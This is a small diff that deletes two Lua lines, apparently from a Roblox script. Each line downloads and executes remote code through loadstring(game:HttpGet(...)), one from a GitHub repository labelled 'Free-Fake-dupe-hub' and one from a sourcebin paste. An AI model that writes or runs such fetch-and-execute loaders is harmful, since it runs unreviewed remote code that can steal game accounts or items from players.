@@ -1,6 +1,0 @@
--- Load the first external script
-loadstring(game:HttpGet("https://raw.githubusercontent.com/UpdatedVersionGrowAGarden/Free-Fake-dupe-hub/refs/heads/main/.lua"))()
-
--- Load the second external script
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/0HWmeNRbLB/0", true))()
-
